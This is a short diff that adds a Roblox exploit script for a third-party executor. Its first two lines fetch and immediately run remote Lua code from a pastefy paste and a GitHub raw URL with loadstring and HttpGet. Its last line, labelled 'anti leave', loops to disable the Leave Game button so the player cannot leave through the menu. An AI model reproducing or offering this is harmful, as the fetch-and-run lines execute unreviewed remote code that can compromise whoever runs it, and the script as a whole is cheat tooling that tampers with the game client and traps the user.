@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/Iadr0zH0/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/real-script/MyOwnLoadingScript/refs/heads/main/Script.lua"))()
+-- anti leave
+
+task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
